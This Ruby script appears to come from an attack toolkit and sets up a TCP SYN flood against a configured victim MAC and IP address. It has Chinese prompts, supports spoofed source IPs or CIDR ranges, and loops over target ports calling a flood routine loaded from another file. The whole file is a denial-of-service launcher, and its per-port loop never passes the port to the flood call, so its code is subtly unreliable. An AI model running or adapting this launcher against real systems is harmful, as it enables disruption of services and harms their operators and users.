require_relative '../config_con_var.rb'
load "#{ThisDir}/lib/attack_tool/tcp/syn_flood.rb"

new_process({
	title: "syn_flood",
	vars: {
		DST_MAC: [str_to_mac(CONFIG[:victim_mac]), "目标mac地址"],
		SRC_IP: [arr_to_dot_dec(CONFIG[:src_ip]), "要使用的源ip地址(点分十进制或CIDR地址)"],
		DST_IP: [arr_to_dot_dec(CONFIG[:victim_ip]), "目标ip地址(点分十进制或CIDR地址)"],
		SRC_PORTS: [0..10, "本机使用的端口（整数或范围值）"],
		DST_PORTS: [0, "要攻击的目标端口（整数或范围值）"],
	},
}) do |vars|
	puts "开始向mac为#{color_purple(vars[:DST_MAC])}，ip为#{color_purple(vars[:DST_IP])}的主机syn洪泛"

	dst_ports = vars[:DST_PORTS]
	dst_ports = dst_ports.class <= Integer ? dst_ports..dst_ports : dst_ports;

	# 若有多个目标端口，则分别进行洪泛
	dst_ports.each do |dst_port|
		TCPP.syn_flood(
			$pcap,
			vars.merge({
				DST_MAC: mac_to_str(vars[:DST_MAC]),
				SRC_IP: dot_dec_to_arr(vars[:SRC_IP]),
				DST_IP: dot_dec_to_arr(vars[:DST_IP]),
			})
		)
		puts "针对端口 #{dst_port} syn洪泛完成, 共发送了#{vars[:SRC_PORTS].size} 个syn包"
	end
end